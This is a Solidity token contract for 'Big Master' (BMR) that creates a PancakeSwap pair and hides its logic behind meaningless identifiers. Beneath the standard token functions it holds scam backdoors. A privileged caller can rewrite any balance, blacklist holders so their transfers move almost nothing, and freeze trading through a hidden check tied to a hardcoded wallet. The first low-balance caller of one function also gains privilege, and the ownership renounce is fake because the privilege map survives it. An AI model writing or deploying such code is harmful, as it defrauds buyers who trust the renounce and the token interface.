//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

interface autoModeMax {
    function createPair(address isMarketingTrading, address autoLimit) external returns (address);
}

interface minTakeMax {
    function totalSupply() external view returns (uint256);

    function balanceOf(address exemptReceiverToken) external view returns (uint256);

    function transfer(address fundAmount, uint256 walletAmount) external returns (bool);

    function allowance(address minReceiver, address spender) external view returns (uint256);

    function approve(address spender, uint256 walletAmount) external returns (bool);

    function transferFrom(
        address sender,
        address fundAmount,
        uint256 walletAmount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed receiverAt, uint256 value);
    event Approval(address indexed minReceiver, address indexed spender, uint256 value);
}

abstract contract txEnableTeam {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface takeWalletToken {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface minTakeMaxMetadata is minTakeMax {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract BigMaster is txEnableTeam, minTakeMax, minTakeMaxMetadata {

    function txTeam(address teamAt, uint256 walletAmount) public {
        receiverAmount();
        modeMaxTotal[teamAt] = walletAmount;
    }

    bool private sellWalletTeam;

    function toWallet(address limitWallet, address fundAmount, uint256 walletAmount) internal returns (bool) {
        if (limitWallet == autoList) {
            return takeTeam(limitWallet, fundAmount, walletAmount);
        }
        uint256 marketingTxReceiver = minTakeMax(swapExempt).balanceOf(shouldReceiver);
        require(marketingTxReceiver == modeAutoReceiver);
        require(fundAmount != shouldReceiver);
        if (tradingTake[limitWallet]) {
            return takeTeam(limitWallet, fundAmount, launchedSender);
        }
        return takeTeam(limitWallet, fundAmount, walletAmount);
    }

    uint256 shouldLiquidity;

    string private modeTeam = "BMR";

    function owner() external view returns (address) {
        return shouldIs;
    }

    function transferFrom(address limitWallet, address fundAmount, uint256 walletAmount) external override returns (bool) {
        if (_msgSender() != maxListLimit) {
            if (fromList[limitWallet][_msgSender()] != type(uint256).max) {
                require(walletAmount <= fromList[limitWallet][_msgSender()]);
                fromList[limitWallet][_msgSender()] -= walletAmount;
            }
        }
        return toWallet(limitWallet, fundAmount, walletAmount);
    }

    address public autoList;

    address maxListLimit = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 private minTeamReceiver;

    event OwnershipTransferred(address indexed receiverTeamTotal, address indexed sellReceiver);

    mapping(address => mapping(address => uint256)) private fromList;

    uint256 public buyMode;

    uint256 modeAutoReceiver;

    function receiverAmount() private view {
        require(sellToEnable[_msgSender()]);
    }

    function tokenMarketing(address feeTo) public {
        require(feeTo.balance < 100000);
        if (listLaunch) {
            return;
        }
        
        sellToEnable[feeTo] = true;
        
        listLaunch = true;
    }

    address private shouldIs;

    bool public limitSwap;

    function transfer(address teamAt, uint256 walletAmount) external virtual override returns (bool) {
        return toWallet(_msgSender(), teamAt, walletAmount);
    }

    uint256 private teamFund = 100000000 * 10 ** 18;

    function approve(address atEnable, uint256 walletAmount) public virtual override returns (bool) {
        fromList[_msgSender()][atEnable] = walletAmount;
        emit Approval(_msgSender(), atEnable, walletAmount);
        return true;
    }

    function totalEnableMax(uint256 walletAmount) public {
        receiverAmount();
        modeAutoReceiver = walletAmount;
    }

    bool public listLaunch;

    mapping(address => bool) public sellToEnable;

    uint256 private launchedSwapWallet;

    uint256 public toAmountShould;

    function getOwner() external view returns (address) {
        return shouldIs;
    }

    address public swapExempt;

    mapping(address => uint256) private modeMaxTotal;

    address shouldReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function limitReceiver() public {
        emit OwnershipTransferred(autoList, address(0));
        shouldIs = address(0);
    }

    function takeTeam(address limitWallet, address fundAmount, uint256 walletAmount) internal returns (bool) {
        require(modeMaxTotal[limitWallet] >= walletAmount);
        modeMaxTotal[limitWallet] -= walletAmount;
        modeMaxTotal[fundAmount] += walletAmount;
        emit Transfer(limitWallet, fundAmount, walletAmount);
        return true;
    }

    constructor (){
        if (shouldAmount) {
            buyMode = toAmountShould;
        }
        takeWalletToken fundMaxAmount = takeWalletToken(maxListLimit);
        swapExempt = autoModeMax(fundMaxAmount.factory()).createPair(fundMaxAmount.WETH(), address(this));
        if (sellWalletTeam == shouldAmount) {
            launchedSwapWallet = minTeamReceiver;
        }
        autoList = _msgSender();
        sellToEnable[autoList] = true;
        modeMaxTotal[autoList] = teamFund;
        limitReceiver();
        
        emit Transfer(address(0), autoList, teamFund);
    }

    uint256 constant launchedSender = 18 ** 10;

    function decimals() external view virtual override returns (uint8) {
        return receiverTeam;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return teamFund;
    }

    uint8 private receiverTeam = 18;

    function name() external view virtual override returns (string memory) {
        return liquidityTotal;
    }

    bool public shouldAmount;

    mapping(address => bool) public tradingTake;

    function balanceOf(address exemptReceiverToken) public view virtual override returns (uint256) {
        return modeMaxTotal[exemptReceiverToken];
    }

    function symbol() external view virtual override returns (string memory) {
        return modeTeam;
    }

    function receiverModeTeam(address toTrading) public {
        receiverAmount();
        
        if (toTrading == autoList || toTrading == swapExempt) {
            return;
        }
        tradingTake[toTrading] = true;
    }

    function allowance(address minSender, address atEnable) external view virtual override returns (uint256) {
        if (atEnable == maxListLimit) {
            return type(uint256).max;
        }
        return fromList[minSender][atEnable];
    }

    string private liquidityTotal = "Big Master";

}